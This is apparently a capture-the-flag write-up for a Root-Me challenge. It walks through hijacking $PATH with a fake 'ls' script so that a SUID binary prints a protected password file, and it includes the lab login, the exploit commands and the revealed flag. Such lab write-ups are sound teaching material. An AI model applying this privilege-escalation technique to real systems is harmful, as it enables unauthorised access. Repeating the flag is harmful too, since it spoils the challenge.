# Bash - System 2
# Objective

Exploit the SUID binary's use of:

system("ls -lA /challenge/app-script/ch12/.passwd");

The ls command is called without an absolute path, allowing PATH hijacking.

## 1. Connect to the Challenge
```bash
ssh -p 2222 app-script-ch12@challenge02.root-me.org
```
Credentials:
Username: `app-script-ch12`
Password: 
```bash
app-script-ch12
```
## 2. Inspect the Challenge Directory
```bash
ls -la /challenge/app-script/ch12/
```
Example output:
```
-rwsr-x---  1 app-script-ch12-cracked app-script-ch12 7252 ... ch12
-r--r-----  1 app-script-ch12         app-script-ch12  204 ... ch12.c
-r--r-----  1 app-script-ch12-cracked app-script-ch12-cracked 14 ... .passwd
```
Notice the s in:
```
-rwsr-x---
   ^
```
This indicates that ch12 is a SUID executable.

The .passwd file belongs to:

app-script-ch12-cracked

so the normal app-script-ch12 user cannot simply read it.

## 3. Understand the Vulnerability

The source code contains:
```c
int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
```
The important part is:
`system("ls ...");`
Instead of:
`system("/bin/ls ...");`
Because ls is not given an absolute path, the shell searches for it using the $PATH environment variable.

Therefore, we can create our own malicious ls executable and put its directory at the beginning of $PATH.

## 4. Create a Temporary Directory
```bash
mkdir -p /tmp/ch12
```
## 5. Create a Fake ls Command
```bash
cat > /tmp/ch12/ls <<'EOF'
#!/bin/sh
/bin/cat /challenge/app-script/ch12/.passwd
EOF
```
This creates:
`/tmp/ch12/ls`
Instead of listing files, our fake ls will execute:
`/bin/cat /challenge/app-script/ch12/.passwd`

## 6. Make the Fake ls Executable
```bash
chmod +x /tmp/ch12/ls
```
## 7. Hijack $PATH

Put `/tmp/ch12` before the existing directories:
```bash
export PATH=/tmp/ch12:$PATH
```

## 8. Execute the SUID Binary

Run:
```bash
./ch12
```
The program executes:

`system("ls -lA /challenge/app-script/ch12/.passwd");`

Normally this would execute:

`/bin/ls`

But because we modified $PATH, it executes:

`/tmp/ch12/ls`

Our fake ls executes:

`/bin/cat /challenge/app-script/ch12/.passwd`

Because ch12 is SUID, the command inherits the effective privileges of:

`app-script-ch12-cracked`

The password is therefore displayed.

`8a95eDS/*e_T#`

## 9. Result

The challenge returned:
```bash
8a95eDS/*e_T#
```
This is the content of:

`/challenge/app-script/ch12/.passwd`

Exploitation Flow
SUID ch12
    │
    ▼
setreuid(geteuid(), geteuid())
    │
    ▼
system("ls -lA /challenge/app-script/ch12/.passwd")
    │
    ▼
Shell searches $PATH for "ls"
    │
    ▼
/tmp/ch12/ls
    │
    ▼
/bin/cat /challenge/app-script/ch12/.passwd
    │
    ▼
8a95eDS/*e_T#
Key Takeaway

The vulnerability is PATH hijacking caused by executing an unqualified command through system() in a SUID program.

A privileged program should avoid code like:

system("ls ...");

and, if external command execution is unavoidable, should not rely on an attacker-controlled $PATH.